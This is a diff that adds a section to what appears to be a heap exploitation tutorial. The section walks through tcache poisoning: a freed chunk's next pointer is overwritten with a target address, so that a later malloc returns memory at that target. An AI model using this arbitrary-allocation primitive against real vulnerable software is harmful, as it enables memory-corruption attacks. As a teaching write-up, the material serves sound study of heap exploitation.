@@ -240,11 +240,36 @@ The second `free` puts ptr1 at the head of the tcache_entry list
 
 tcache_entry = ptr1 -> ptr0
 
+<br>
 
+```c
+*ptr1 = (unsigned long int)&target;
+```
+
+Now we poison the *next ptr of ptr1 (which currently is pointing to ptr0)
+
+tcache_entry = ptr1 -> target
+
+<br>
+
+```c
+printf("Malloc Allocated: %p\n\n", malloc(0x10));
+```
+
+dummy malloc uses the memory at ptr1
+
+<br>
+
+```c
+printf("Malloc Allocated: %p\n\n", malloc(0x10));
+```
+
+next malloc is now at our poisoned target addr :)
 
 
 
 <br>
+
 ---
 
 
